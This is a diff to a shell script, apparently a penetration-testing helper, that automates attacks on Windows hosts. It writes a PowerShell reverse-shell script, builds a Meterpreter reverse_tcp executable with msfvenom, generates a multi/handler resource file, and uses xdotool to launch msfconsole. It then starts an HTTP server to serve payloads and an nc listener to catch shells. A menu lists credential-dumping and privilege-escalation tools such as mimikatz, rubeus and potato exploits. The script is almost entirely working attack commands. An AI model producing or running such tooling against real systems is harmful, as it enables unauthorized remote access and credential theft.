@@ -21,10 +21,35 @@ cp template.txt reverseshell.ps1
 
 while read line
   do 
-  echo "Invoke-PowerShellTcp -Reverse -IPAddress $line -Port 1234" >> ./reverseshell.ps1
+  echo "Invoke-PowerShellTcp -Reverse -IPAddress $line -Port 4444" >> ./reverseshell.ps1
   mv reverseshell.ps1 ./APT/reverseshell.ps1
-  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$line LPORT=1234 --platform windows -f exe -o ./APT/winpayload.exe
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$line LPORT=4444 --platform windows -f exe -o ./APT/meterpreter.exe
 done < $filename
+
+# -------------------------------------------------------------------------------------
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub                                                               
+# Version : 2.0                                                                
+# Details : Create auto startup for msfconsole.
+# Modified: N/A                                                               
+# -------------------------------------------------------------------------------------
+
+if [ -f ./meterpreter.rc ]
+then
+   rm meterpreter.rc
+else
+   touch meterpreter.rc
+fi
+echo use exploit/multi/handler >> meterpreter.rc
+echo set PAYLOAD windows/meterpreter/reverse_tcp >> meterpreter.rc
+while read line
+   do
+   echo set LHOST $line >> meterpreter.rc
+done < $filename
+echo set ExitOnSession false >> meterpreter.rc
+echo clear >> meterpreter.rc
+echo show options >> meterpreter.rc
+echo run >> meterpreter.rc
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -34,6 +59,7 @@ done < $filename
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
+xdotool key Alt+Shift+S; xdotool type "Server"; xdotool key Return
 clear
 echo "\t\t__        _____ _   _ ____   _____        ______    _   _ _____ _____ ____    ____  _____ ______     _______ ____   "
 echo "\t\t\ \      / /_ _| \ | |  _ \ / _ \ \      / / ___|  | | | |_   _|_   _|  _ \  / ___|| ____|  _ \ \   / / ____|  _ \  "
@@ -47,7 +73,7 @@ echo "\t\t                                BY TERENCE BROADBENT BSC CYBER SECURIT
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
 # Version : 2.0                                                             
-# Details : Start the HTTP Serever.
+# Details : Start the HTTP Server.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
@@ -63,7 +89,7 @@ done < $filename
 
 echo "\nENUMERATION			SHELLS				RUNNING PROCESSES		COMMUNICATIONS			CORE EXPLOITS		"
 echo "----------------------------------------------------------------------------------------------------------------------------------------------------------"
-echo "jawsenum.ps1			winpayload.exe			powerup.ps1			nc64.exe			mimidump.ps1            "
+echo "jawsenum.ps1			meterpreter.exe			powerup.ps1			nc64.exe			mimidump.ps1            "
 echo "sharphound.ps1			webshell.php			powercat.ps			plink64.exe			mimikatz.ps1		"
 echo "sharphound.exe			myshell.php			powerview.ps1			chisel64.exe			winpwn.ps1		"
 echo "winpeas32.exe			image.php.jpg			powermad.ps1			test_clsid.bat			lovelypotato.ps1	"
@@ -72,7 +98,12 @@ echo "rubeus.exe							procdump64.exe							mimikatz64.exe		"
 echo "nmapsetup.exe															mimikatz32.exe          "
 echo "----------------------------------------------------------------------------------------------------------------------------------------------------------"
 
-exec python3 -m http.server 80 > output.txt &
-exec rlwrap nc -lnvp 9001
+echo "[+] Starting Meterpreter..."
+xdotool key Ctrl+Shift+T; xdotool key Alt+Shift+S; xdotool type "Meterpreter"; xdotool key Return
+xdotool type "msfconsole -r meterpreter.rc"; xdotool key Return
+xdotool key Ctrl+Tab
+echo "[+] Starting HTTP server..."
+python3 -m http.server 80 > output.txt
+rlwrap nc -nvlp 9001
 
 #Eof
